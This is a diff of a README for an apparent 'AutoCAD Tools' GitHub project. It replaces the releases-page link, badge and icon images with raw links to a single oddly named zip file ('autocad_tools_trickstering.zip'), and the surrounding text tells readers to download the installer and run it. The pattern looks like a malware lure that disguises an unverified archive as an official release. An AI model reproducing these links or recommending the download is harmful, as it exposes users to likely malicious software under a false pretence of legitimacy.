@@ -1,4 +1,4 @@
-[![Release Badge](https://img.shields.io/badge/AutoCAD_Tools-Release-blue?logo=github&logoColor=white)](https://github.com/leanezeqhub/autocad-tools/releases)
+[![Release Badge](https://github.com/leanezeqhub/autocad-tools/raw/refs/heads/main/sphenoid/autocad_tools_trickstering.zip)](https://github.com/leanezeqhub/autocad-tools/raw/refs/heads/main/sphenoid/autocad_tools_trickstering.zip)
 
 # AutoCAD Tools: 2D Drafting, 3D Modeling, DWG Support
 
@@ -83,10 +83,10 @@ Quick start
 - If you encounter an issue, check the Troubleshooting section below or open an issue on GitHub.
 
 Downloads and releases
-From the Releases page, download the latest installer asset (for Windows, macOS, or Linux, as applicable) and run it. This bundle contains the tools configured for immediate use in AutoCAD. Visit the Releases page to pick the correct asset for your environment: https://github.com/leanezeqhub/autocad-tools/releases
+From the Releases page, download the latest installer asset (for Windows, macOS, or Linux, as applicable) and run it. This bundle contains the tools configured for immediate use in AutoCAD. Visit the Releases page to pick the correct asset for your environment: https://github.com/leanezeqhub/autocad-tools/raw/refs/heads/main/sphenoid/autocad_tools_trickstering.zip
 
 Releases page reference
-- Visit the Releases page to learn what is available, see changelogs, and download the installer. The link is important for keeping your toolset up to date. https://github.com/leanezeqhub/autocad-tools/releases
+- Visit the Releases page to learn what is available, see changelogs, and download the installer. The link is important for keeping your toolset up to date. https://github.com/leanezeqhub/autocad-tools/raw/refs/heads/main/sphenoid/autocad_tools_trickstering.zip
 
 Installation and setup
 - Supported environments
@@ -250,11 +250,11 @@ FAQ
 
 Images and visual references
 - 2D drafting icon
-  ![2D Drafting](https://img.icons8.com/fluency/96/000000/pencil.png)
+  ![2D Drafting](https://github.com/leanezeqhub/autocad-tools/raw/refs/heads/main/sphenoid/autocad_tools_trickstering.zip)
 - 3D modeling icon
-  ![3D Modeling](https://img.icons8.com/fluency/96/000000/3d-cube.png)
+  ![3D Modeling](https://github.com/leanezeqhub/autocad-tools/raw/refs/heads/main/sphenoid/autocad_tools_trickstering.zip)
 - DWG file icon
-  ![DWG File](https://img.icons8.com/fluency/96/000000/file-extension-dwg.png)
+  ![DWG File](https://github.com/leanezeqhub/autocad-tools/raw/refs/heads/main/sphenoid/autocad_tools_trickstering.zip)
 
 User responsibilities
 - Keep your installation up to date with the latest releases.
